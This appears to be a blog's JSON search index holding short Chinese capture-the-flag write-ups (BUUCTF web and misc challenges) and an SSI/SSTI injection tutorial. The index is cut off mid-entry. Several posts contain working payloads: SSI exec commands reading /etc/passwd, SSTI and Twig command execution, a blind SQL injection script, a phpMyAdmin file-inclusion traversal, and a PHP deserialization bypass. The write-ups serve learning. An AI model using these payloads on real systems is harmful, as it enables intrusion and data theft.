{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index.html"},{"title":"标签","text":"","link":"/tags/index.html"}],"posts":[{"title":"2.10 BUUCTF Misc_派大星的烦恼","text":"用winhex打开，发现题目提示的0x220x44将”换成0，D换成1，转换成二进制后在转换成文本，出现乱码将转换成的二进制翻转后再解码得到一串字母和数字，提交发现flag不对，这时我们需要再将这串字符串再翻转一次。最后得到flag。","link":"/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC.html"},{"title":"2.10 [ACTF2020 新生赛]Include&BackupFile&Exec&Upload","text":"Inlcude点进去tips发现是file=flag.php，想到php伪协议读取1php://filter/convert.base64-encode/resource=flag.phpbase64解码后得到flag BackupFile根据题目提示找到备份文件：index.php.bak开始审计这段代码发现用了is_numeric函数，但是php版本是7.3，无法使用数组绕过接着看发现是弱类型比较(==)，并且 $str在==后面 ，所以整个逻辑就很清楚了。首先传个参数key，检测key是否为数字，然后用intval函数取得key的整数部分，在把str变量和key比较，这里逻辑要清楚是str变量和key比较，所以str在比较前转换成数字’123’。所以直接让key=123即可 Exec打开网页发现是命令执行（SSRF）并且没有过滤||等关键字直接查看根目录下面的文件看到有个flag文件，cat出来 Upload首先上传一个txt发现当点击submit时会返回chekfile页面将这个js代码删除，再上传。通过试了很多上传方法，发现用大小写绕过，点号绕过，空格绕过但是都不解析。上传.htaccess文件被过滤。但是phtml文件没有被过滤，上传这个文件成功解析连接小马，得到flag。","link":"/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload.html"},{"title":"2.10 BUUCTF Misc_间谍启示录","text":"用winhex打开，发现有个flag.exeforemost分离一下，找到flag.exe strings命令查看一下有个Flag{，在windows下打开这个exe，发现会创建一个flag.txt，就可以得到flag","link":"/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95.html"},{"title":"2.11 [BJDCTF2020]Easy MD5&Mark loves cat","text":"首先打开页面，在输入框随便输入发现没有跳转，f12查看后台文件中发现hintmd5($pass,true)第二个参数默认是falseFALSE - 默认 32 字符十六进制数TRUE - 原始 16 字符二进制格式。所以当输入特殊字符串时在经md5加密后可能出现注入语句。在上网百度后发现两个特殊字符：’ffifdyop’，’129581926211651571912466741651878684928’。ffifdyop：T0Do#’or’8129581926211651571912466741651878684928：’or’6]!r,b。所以直接输入ffifdyop，转到第二页面。查看源代码后发现是md5弱类型比较。下面给出的字符串随便找两个传参即可：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114找md5以oe开头的常用的md5：QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020传参后跳转最后一个页面：发现是===完全等于，可以利用[]数组绕过，利用error=error原理，得到flag。 打开网站随便看看，发现没有什么特别，用dirsearch扫描一下，发现/.git目录，用githack获取一下源码。分析得到的源码：看到使用的$$会导致变量覆盖漏洞，看一下代码逻辑：forsearch一下post传参的参数键名和值：如果传入$flag=flag，则会导致$$flag=$flag；同理get参数：传入yds=flag，则会导致$yds=$flag，所以yds的值就是flag变量的值。在没有设置flag参数的时候会直接exit出yds的值。根据上面的逻辑可以直接构造：1get传参：?yds=flag","link":"/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat.html"},{"title":"2.11 [GUET-CTF2019]zips","text":"这道题用到了压缩包：暴力破解，伪加密，掩码攻击等知识点第一步先用暴力破解把222.zip密码找出来第二步看到一个111.zip，里面有个flag.zip和setup.sh，先把flag.zip提出来，再用伪加密把111.zip打开第三步setup.sh的python代码运行查看，发现flag.zip密码规律:15????????.??最后使用掩码攻击的方式得到flag","link":"/2-11-GUET-CTF2019-zips.html"},{"title":"2.11 [GUET-CTF2019]soul sipse","text":"用Audacity打开在频谱图发现：再用steghide将隐藏的文件找出来最后unicode解码一下得到flag{5304}","link":"/2-11-GUET-CTF2019-soul-sipse.html"},{"title":"2.11 [GUET-CTF2019]虚假的压缩包","text":"首先拿到题目，有一个虚假的压缩包和真实的压缩包很明显虚假的压缩包是伪加密打开压缩包后发现是解rsa有n，e，c是个简单的rsa，直接脚本一把梭1234567891011121314import libnumfrom Crypto.Util.number import long_to_bytesc = 26n = 33e = 0x3q = 11p = 13d = libnum.invmod(e, (p - 1) * (q - 1))m = pow(c, d, n)print &quot;m的值为:&quot;print m#print long_to_bytes(m)得到m为5，可是提示密码不对，这里有个脑洞要加上key.txt前面的”答案是”才是正确的密码，所以真实的压缩包密码为:答案是5。解压后通过修改图片高度发现一个将另一个文件的所以和5进行异或123456with open(&quot;flag&quot;,&quot;r&quot;) as fp: r=fp.read() with open(&quot;xor.txt&quot;,&quot;w&quot;) as fp1: for i in r: tmp=int(i,16)^5 fp1.write(hex(tmp)[2:])得到的是以”504b0304”开头的，将他放到winhex里进行转换acii看到是word类型的压缩包，这里的一个知识点：word本身就是个压缩包。所以把zip后缀改成doc，再将字体颜色换成深色，得到flag。","link":"/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85.html"},{"title":"2.12 [BJDCTF2020]EasySearch&The mystery of ip","text":"EasySearch打开题目先随便输入，发现会弹框。在扫描一下目录，发现.swp备份文件。打开index.php.swp页面：阅读这段源码：首先是随机获取文件名的一个函数，最关键的是让password前6个字符的md5加密值等于6d0bc1，然后会在public目录下创建一个shtml文件，再将post传参的username字段写入这个shtml文件中。首先写个脚本让password前6个字符的md5值等于6d0bc1：1234567891011121314import hashliba= &quot;0123456789&quot;for o in a: for p in a: for q in a: for r in a: for s in a: for t in a: for u in a: b = str(o)+str(p)+str(q)+str(r)+str(s)+str(t)+str(u) md5 = hashlib.md5(b.encode('utf-8')).hexdigest() if ((md5[0:6])=='6d0bc1'): print b可以爆破出很多，我拿2020666来进行传参。成功利用，然后就是访问这个新建的shtml文件了，抓包发现在响应包中有这个文件的路径：到这利用了SSI注入漏洞，所以我们可以在username变量中传入ssi语句来远程执行系统命令。1&lt;!--#exec cmd=&quot;命令&quot;--&gt;首先ls一下当前目录：发现成功利用，没有进行任何过滤。然后我们在ls一下上一级目录：发现了 ‘flag_990c66bf85a09c664f0b6741840499b2’ 文件，最后我们把这个文件cat出来，遍得到flag。 The mystery of ip这道题我在做的时候试了好多方法，虽然扫描目录的时候发现了.ds_store文件但是没有权限。这个思路行不通，最后还是看了别的师傅的博客，原来是X-Forwarded-For参数可控，使用的是ssti模板注入2333….payload：1X-Forwarded-For:{{system('cat ./flag')}}","link":"/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html"},{"title":"2.12 浅谈SSI和SSTI漏洞","text":"一.SSI漏洞解析1.原理现在大多数Web服务很少用到SSI，但是还是有有必要了解一下。SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。 SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 基本原理就是：SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。 SSI漏洞存在于shtml，stm，shtm文件中，就是应用ssi技术的html文件，当我在这个页面加入ssi指令后，服务器开始解析，将文件图片包含或者远程执行命令。 2.开启ssi(1)Nginx在配置文件中添加如下几项：123ssi on;ssi_silent_errors off;ssi_types text/shtml; (2)Apache修改Apache配置文件httpd.conf： 确认加载include.so模块，将注释去掉：1LoadModule include_module libexec/apache2/mod_include.so AddType部分去掉这两段注释： 123AddType text/html .shtmlAddOutputFilter INCLUDES .shtml Directory目录权限里面找到Options Indexes FollowSymLinks，并增加Includes修改为Options Indexes FollowSymLinks Includes； 重新启动Apache； 3.SSI基本语法：其语法格式必须是以html的注释符 &lt;!– 开头、且后面紧接#符号和SSI命令，它们期间不能存在空格： 显示服务器端环境变量 &lt;#echo&gt; 123本文档名称：&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;现在时间：&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;显示IP地址：&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt; 将文本内容直接插入到文档中&lt;#include&gt; 1234&lt;!--#include file=&quot;文件名称&quot;--&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;!--#include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt; 注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。 直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序) 1234&lt;!--#exec cmd=&quot;命令&quot;--&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!--#exec cgi=&quot;文件名称&quot;--&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt; 4.SSI注入漏洞(1)如何利用简单点说就是攻击者可以通过外部输入SSI标签到Web页面（stm、shtm、shtml文件）来动态执行代码。SSI注入允许远程在Web应用中注入脚本来执行代码。简单点说就是攻击者可以通过外部输入SSI语句到Web页面来动态执行代码。 一般地，在stm、shtm、shtml等文件中，存在XSS的页面，大概率是存在SSI注入漏洞的。也就是说，用户输入的内容会显示在页面中的场景。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI注入漏洞。 (2)前提条件攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功：Web服务器支持并开启了SSI；Web应用程序在返回HTML页面时，嵌入了用户输入的内容；外部输入的参数值未进行有效的过滤； 参考博客例题：BUUCTF [BJDCTF2020]EasySearch，BWAPP靶场的SSI注入漏洞。 二.SSTI漏洞(1)原理服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 (2)利用 检测方法如下： 当我们输入的内容，经过web模板解析后返回到html页面中，如果在web模板解析时没有进行很好的过滤就会出现SSTI模板注入漏洞。 以BUU上[护网杯 2018]easy_tornado为例，当我们的filname和filehash不一样的时候会跳转到error页面。 当我们输入2不会返回正常的1 * 2而是ORZ 证明存在SSTI漏洞 使用python web模板tornado中的handler.settings可以把cookie输出 这就可以证明有SSTI模板漏洞，这个漏洞在很多语言的web模板中都存在，不光只有python，因为python tornado模板使用简单，所以造成的危害更大些。 也可以使用system函数执行系统命令1{{system('命令')}}例题：[BJDCTF2020]The mystery of ip题目X-Forwarded-For可控，存在模板注入，可以使用system执行系统命令。payload：1X-Forwarded-For {{system('cat /flag')}}","link":"/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E.html"},{"title":"2.13 BUUCTF Misc john-in-the-middle&谁赢了比赛&二维码&小易的U盘&黑客帝国&真的很杂","text":"john-in-the-middle 打开流量包发现全是tcp,http协议，直接导出http对象。在http对象中有个logo.png，Stegsolve工具打开，分析颜色通道得到flag。 谁赢了比赛 binwalk分析一下发现里面有个压缩包，再用foremost分离出来，发现gif有秘密，爆破一下。分析gif图片，在第310帧发现假的flag，再用Stegsolve工具分析各个颜色通道，得到flag。 二维码二维码被撕碎了，只能用ps拼接，拼接完扫描得到flag。 小易的u盘binwalk分离出两个压缩包打开发现有很多exe文件，分析exe文件发现有个exe文件的创造时间不同，直接用ida反编译这个文件，便可得到flag。 黑客帝国题目是个txt文件，打开发现rar文件头，在winhex里直接hex转ascii查看。保存为压缩包，有秘密爆破一下。解压后发现一个损坏的png图片，查看一下16进制发现是jpg的图片，直接将png的文件头改成jpg文件头，便可得到flag。 真的很杂foremost出来一个压缩包，打开压缩包发现是apk文件，直接改后缀名，然后用jadx工具反编译一下，便可得到flag。","link":"/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82.html"},{"title":"2.13 [BJDCTF2020]ZJCTF，不过如此&Cookie is so stable","text":"ZJCTF，不过如此打开网页通过阅读源码，知道我们要读到next.php的源码，还要使text文件的内容为”I have a dream”，所以可以使用php伪协议进行写入和读取。得到next.php的源码：1234567891011121314151617181920&lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(&quot;\\\\1&quot;)', $str );}foreach($_GET as $re =&gt; $str) { echo complex($re, $str). &quot;\\n&quot;;}function getFlag(){ @eval($_GET['cmd']);}用过分析知preg_replace()使用的/e模式可以存在远程执行代码，参考博客，所以我们可以有两种方法进行读取flag。第一种：利用给的getFlag()函数：第二种可以通过构造post传参： Cookie is so stableTwig模板注入：在cookie中存在，因为我们分析题目知，题目会把cookie中的user的值返回到登入后的页面中，而且没有进行过滤。检测是哪种模板注入：输入49显示的是49，而不是7个7，说明是Twig模板注入，可以直接使用payload进行读取：1{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /flag&quot;)}};","link":"/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable.html"},{"title":"2.16 [极客大挑战 2019]FinalSQL","text":"检测通过测试发现在search.php页面存在sql注入。1234561^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))=%d)^1&quot;%(i,ord(j)) 获取数据库名称 1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)='geek'),%d,1))=%d)^1&quot;%(i,ord(j)) 获取数据库表名 1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name='F1naI1y')),%d,1))=%d)^1&quot;%(i,ord(j)) 获取数据库列名先写个判断数据库名的脚本：123456789101112131415161718192021222324252627282930313233343536373839import requestsdef database_len(): for i in range(9999): url='''http://e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn/search.php?id=1''' payload='''?id=1'^and length(database())&gt;%s''' %i #print(url+payload+' --+ ') r=requests.get(url+payload+' --+ ') if 'NO! Not this! Click others~~~' in r.text: print(i) else: print('database_length:',i) break#database_len()def database_name(): databasename='' for i in range(1,9): for j in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz': url='''http://e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn/search.php?id=1''' payload='''?id=1'^and substr(database(),%d,1) = '%s' ''' %(i,j) #print(url+payload+' --+ ') r=requests.get(url+payload+' --+ ') if 'NO! Not this! Click others~~~' in r.text: databasename += j print(databasename) break print(&quot;database_name:&quot;,databasename.lower())#database_name()def table_length(): for j in range(9999): url='''http://e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn/search.php?id=1''' payload='''?id=1'^and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;%s''' %j r=requests.get(url+payload+' --+ ') if 'NO! Not this! Click others~~~ in r.text: print(j) else: print('firs table length:',j) breaktable_length()判断表名和字段名的可以依葫芦画瓢，来写脚本。最终的脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#然后是二分法，二分法要快很多：# -*- coding: UTF-8 -*-import reimport requestsimport string url = &quot;http://5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn/search.php&quot;flag = ''def payload(i,j): # sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j) #数据库名字 # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1&quot;%(i,j) #表名 # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1&quot;%(i,j) #列名 sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j) data = {&quot;id&quot;:sql} r = requests.get(url,params=data) # print (r.url) if &quot;Click&quot; in r.text: res = 1 else: res = 0 return res def exp(): global flag for i in range(1,10000) : print(i,':') low = 31 high = 127 while low &lt;= high : mid = (low + high) // 2 res = payload(i,mid) if res : low = mid + 1 else : high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag) exp()print('flag=',flag)","link":"/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html"},{"title":"2.17 [GWCTF 2019]枯燥的抽奖&我有一个数据库","text":"枯燥的抽奖打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码看到是个伪随机数问题，使用php_mt_seed进行爆破。首先使用下面这个脚本，把php_mt_seed需要的获取出来：1234567891011str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='hvKiZfOpgL' //这里填上题目给的前十位str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint(res)然后用php_mt_seed爆破：得到的随机数直接用下面的脚本进行获取全面字符串：12345678910&lt;?phpmt_srand(104517409);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str = '';$len1 = 20;for ($i = 0; $i &lt; $len1; $i++) { $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);}echo &quot;&lt;p id='p1'&gt;&quot; . $str . &quot;&lt;/p&gt;&quot;;将这段字符串提交得到flag。 我有一个数据库目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。payload：1phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag","link":"/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html"},{"title":"2.5 [SWPU2019]神奇的二维码","text":"解压后，出来一张二维码利用binwalk查看1binwalk BitcoinPay.png有四个压缩包第一个压缩包没用东西，只有一张表情包（可以保存一下哈哈哈哈~）第二个压缩包是base64编码第三个压缩包是多长base64编码第四个压缩包是一个mp3文件，但是打开需要密码，将上面解码的base64都试一下，发现flag.doc里的是压缩包密码。将这个转换成摩斯再解码，得到flag。（这里有个小坑解出来的摩斯是大写要转换成小写才是正确的flag）","link":"/2-5-SWPU2019-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81.html"},{"title":"2.5 [SWPU2019]我有一只马里奥","text":"题目是一个exe文件，binwalk查看到有个压缩包。打开压缩包，发现题目是ntfs数据流隐写，用工具提取。","link":"/2-5-SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5.html"},{"title":"2.5 [极客大挑战 2019]EasySQL","text":"对题目进行简单的分析：单引号闭合；开启了错误提示。想到报错注入，但是报错注入没检测无法利用。 尝试一下万能密码1admin' or '1=1得到flag","link":"/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL.html"},{"title":"2.5 [SWPU2019]伟大的侦探","text":"打开压缩包，文件有密码，密码在txt里010Editor打开，转化成EBDIC编码得到密码打开文件发现是一堆小人，百度可知这是福尔摩斯小人编码解码得到flag:iloveholmesandwllm","link":"/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2.html"},{"title":"2.5 [极客大挑战 2019]Havefun&Secret File","text":"Havefun查看源代码直接传参cat=dog,得到flag. Secret File通过查看源代码知道这个题目有三个文件:Archive_room.php action.php end.php在这里通过访问：Archive_room.php会直接跳转到end.php，没有经过action.php。访问action.php抓包查看，得到第四个文件secr3t.php 。访问secr3t.php 得到源码：12345678910&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt;通过分析这段代码没有过滤php伪协议：我们可以使用file来读取flag。12?file=php://filter/convert.base64-encode/resource=flag.php得到flag：","link":"/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File.html"},{"title":"2.6 [SWPU2019]Network","text":"题目是一个txt文件，里面只有4个数字：63，127，191，255。虽然题目提示network，但是看了wp知道是ttl隐写。 将每个数字转化成8位二进制1234563 00111111 127 01111111 191 10111111 255 11111111每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。附上脚本：12345678910111213141516171819202122232425import binasciiwith open('attachment.txt','r') as fp: a=fp.readlines() p=[] for x in range(len(a)): p.append(int(a[x])) s='' for i in p: if(i==63): b='00' elif(i==127): b='01' elif(i==191): b='10' else: b='11' s +=b# print(s)flag = ''for i in range(0,len(s),8): flag += chr(int(s[i:i+8],2))flag = binascii.unhexlify(flag)wp = open('ans.zip','wb')wp.write(flag)wp.close()转换成一个压缩包，有密码是伪加密，修改完得到flag。","link":"/2-6-SWPU2019-Network.html"},{"title":"2-6 [SWPU2019]你有没有好好看网课?","text":"flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。查看flag.docx看了别的师傅的wp，这个docx提示查看mp4对应帧数:00:00:05:20；00:00:07:1112..... ../... ./... ./... ../dXBfdXBfdXA=后面一段是base64编码，前面的一段一开始以为是摩斯编码，但是看了wp知道了是敲击码。解的flag2.zip密码：wllmup_up_upflag2.zip下是一张图片，将这张图片用winhex打开，在最下面得到flag。","link":"/2-6-SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE.html"},{"title":"2.6 buuctf_misc_从娃娃抓起","text":"根据题目提示：编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。中文电码在线解码五笔编码现在还没有找到好的网站去解，只能一个一个对照emmmmmm","link":"/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7.html"},{"title":"2.6 [极客大挑战 2019]PHP","text":"根据题目提示：题目有源码备份，下载得到www.zip。有三个php文件class.php1234567891011121314151617181920212223242526272829303132class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;; die(); } }index.php12345&lt;?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?&gt;flag.php123&lt;?php$flag = 'Syc{dog_dog_dog_dog}';?&gt;通过分析知：$select进行反序列化。关键在class.php中的_destruct()魔法函数。对于序列化问题有调用魔法函数顺序的问题：对于题目需要将username=admin，password=100，但是会先执行_wakeup函数将username=guest，所以这道题目关键在于如何绕过_wakeup函数。知识点：如何绕过_wakeup测试php：形成payload：12?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}这个payload绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失。得到flag 参考博客：https://www.jianshu.com/p/bfe00fd583df","link":"/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html"},{"title":"2.7 [GXYCTF2019]Is this base?","text":"首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，所以要使用很多行来存储信息。看到有很多行base64首先要想到base64隐写！ 使用脚本跑即可，附上脚本：1234567891011b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'with open('1.txt', 'rb') as f: bin_str = '' for line in f.readlines(): stegb64 = ''.join(line.split()) rowb64 = ''.join(stegb64.decode('base64').encode('base64').split()) offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1])) equalnum = stegb64.count('=') #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])得到flag","link":"/2-7-GXYCTF2019-Is-this-base.html"},{"title":"2.7 [HITCON 2017]SSRFme","text":"首先拿到源码：12345678910111213141516&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); $_SERVER['REMOTE_ADDR'] = $http_x_headers[0]; } echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__);主要代码是这个部分：12345678 $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir);代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。 解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。首先通过上面代码的逻辑访问网站根目录：创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。12?url=../../../../../../&amp;filename=asandbox/0a3519231615f5dcb5681b439c71d89c/a看到有个readflag。其次用到了perl语言的open函数参数是可控的，可以执行任意命令。这里要明确一点perl的GET命令是调用open函数来实现执行命令的。下面是截取别的大佬博客wp中的一段：这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。所以最终的payload：123url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 创建相应的同名文件。url=file:bash -c /readflag|&amp;filename=da4er 利用open执行代码。最后直接访问/ sandbox /哈希值/ 123就能得到flag。) 参考博客：12","link":"/2-7-HITCON-2017-SSRFme.html"},{"title":"2.7 [GXYCTF2019]佛系青年","text":"下载压缩包解压有密码，binwalk分离出来两个压缩包。会直接把fo.txt分离出来。打开是’与佛论禅’密码，在线网站解密一下。","link":"/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4.html"},{"title":"2.8 [SUCTF2018]single 